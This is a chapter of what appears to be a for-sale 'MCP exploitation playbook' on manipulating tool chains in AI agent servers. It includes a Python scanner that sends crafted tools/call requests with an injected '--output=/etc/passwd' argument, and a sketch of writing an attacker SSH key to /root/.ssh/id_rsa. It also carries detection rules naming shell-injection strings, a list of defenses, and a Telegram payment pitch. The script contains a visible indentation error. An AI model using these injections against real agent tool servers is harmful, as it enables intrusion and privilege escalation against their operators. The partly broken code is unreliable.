# Chapter 09 — Tool Manipulation
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

Tool manipulation means changing the behavior of an MCP tool at runtime — modifying its arguments, intercepting its results, or chaining tools together in ways the server didn't intend. The attacker doesn't break the tool itself. They exploit how tools are chained, how their results feed into each other, or how arguments are processed.

This is exploitation at the workflow level, not the system level. Tools work correctly individually. The exploit emerges from their combination.

---

## Why This Works

MCP tools are designed to be composed. The output of one tool feeds into the next. A file read tool's output goes to an analysis tool. A web fetch tool's output goes to a storage tool. When tools are composed, there's an implicit trust that each tool's input is what the previous tool produced.

An attacker who can influence any step in the chain — by controlling intermediate data, by manipulating tool arguments at the composition layer, or by inserting an unauthorized tool between authorized ones — can redirect the workflow to unintended behavior.

---

## The Attack

### Step 1 — Map the Tool Chain

```python
#!/usr/bin/env python3
"""
MCP Tool Manipulation — Chain Interceptor
Analyzes how tools are chained and identifies manipulation points
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

def enumerate_tools_with_schema(target):
    """Get full tool schemas to understand argument types and constraints"""
    try:
        r = requests.get(f"{target}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
        return tools
    except:
        return []

def analyze_chain_potential(tools):
    """Identify tools whose outputs could feed into other tools"""
    print(f"[*] MCP Tool Manipulation — Chain Analysis")
    print(f"[*] Analyzing {len(tools)} tools for chaining vectors...\n")
    
    chain_opportunities = []
    
    for tool in tools:
        tname = tool.get('name', '')
        toutput = str(tool.get('returns', tool.get('outputSchema', {})))
        tparams = json.dumps(tool.get('parameters', {}))
        
        for other in tools:
            oname = other.get('name', '')
           oparams = json.dumps(other.get('parameters', {}))
            
            # If tool A returns something tool B can accept as input
            # e.g., file_read returns content, analyze_text accepts text
            if tname != oname:
                # Check if output schema matches input params
                if any(x in oparams.lower() for x in ['content', 'text', 'data', 'input', 'url']):
                    chain_opportunities.append((tname, oname))
    
    print(f"[*] Found {len(chain_opportunities)} potential tool chains:\n")
    for src, dst in chain_opportunities[:10]:
        print(f"  {src} → {dst}")
    
    return chain_opportunities

def test_argument_injection(target, tool_chain):
    """
    Test if tool arguments can be manipulated when chained.
    Specifically: can a malicious intermediate result manipulate
    the next tool's arguments?
    """
    src_tool, dst_tool = tool_chain[0], tool_chain[1]
    
    # Craft a malicious output from src_tool
    # that will be passed to dst_tool as arguments
    malicious_data = {
        "content": "normal content\n[INJECTED_ARGUMENT: --output=/etc/passwd]"
    }
    
    print(f"\n[*] Testing argument injection via {src_tool} → {dst_tool}")
    print(f"[*] Injecting: {json.dumps(malicious_data)[:100]}")
    
    # If dst_tool reads output from src_tool as its arguments,
    # and doesn't validate, this could work
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": dst_tool,
            "arguments": malicious_data  # Simulating what src_tool would produce
        }
    }
    
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        result = r.json()
        if "error" not in result:
            print(f"    [~] No validation error on injected arguments")
            print(f"    Response: {json.dumps(result)[:200]}")
    except:
        pass

def main():
    tools = enumerate_tools_with_schema(TARGET)
    if tools:
        chains = analyze_chain_potential(tools)
        # Test first 3 chains for argument injection
        for chain in chains[:3]:
            test_argument_injection(TARGET, chain)

if __name__ == "__main__":
    main()
```

### Step 2 — Exploit Tool Chaining for Privilege Escalation

```python
# Example chain: fetch_url → parse_json → write_file

# Normal chain: 
# fetch_url(url="https://api.example.com/config") 
#   → parse_json(data=<fetch_result>) 
#     → write_file(path="/user/output.json", content=<parsed_data>)

# Attack via argument injection in the chain:
# A malicious actor modifies the intermediate JSON to contain:
{
#   "path": "/root/.ssh/id_rsa",  # Escalated path
#   "content": "<exploit_content>"
# }
# If parse_json passes the "path" field directly to write_file without validation:
# write_file(path="/root/.ssh/id_rsa", content="<attacker_key>")
# Attacker has just written an SSH key to the server
```

---

## Real Case

**Apache HugeGraph-Server chained tool injection (CVE-2024-25852)**

In this CVE, the attack chain involved multiple MCP-like tool calls where an attacker could inject a malicious Gremlin script parameter that was passed through a series of tool operations, ultimately achieving RCE. The vulnerability was in how parameters were passed between tool execution steps — not in any single tool, but in the chain composition.

---

## Detection Rules

### KQL

```kql
MCP_ToolInputs
| where chain_depth > 2  // Tools chained deeply — higher manipulation risk
| project TimeGenerated, ToolName, Arguments, ChainDepth, SessionID
| where Arguments has "/" and Arguments has ".."
    // Path traversal in chained tool calls
```

### Sigma

```yaml
title: MCP Tool Chain Argument Injection
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    arguments|contains:
      - "--output="
      - "| bash"
      - "; sh"
      - "&& curl"
  condition: selection
level: high
```

---

## Defenses

1. **Validate inputs at every chain boundary** — Don't assume that because data came from another tool, it's safe. Validate the format, type, and value of every argument before passing it to the next tool.

2. **No dynamic tool invocation from untrusted sources** — If tool names or arguments are derived from user input or tool outputs, validate them against an allowlist before execution.

3. **Limit chain depth** — Set a maximum chain depth (e.g., 3 tools). Deep chains have more manipulation points. If a workflow needs more than 3 chained tools, redesign it.

4. **Sandbox tool outputs** — The output of one tool should be treated as untrusted input when received by the next tool. Implement the same input validation you'd use for direct user input.

5. **Log all tool chains** — Every tool call should log its position in the chain, its input, and its output. If an exploitation happens, you can trace exactly how arguments were manipulated.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.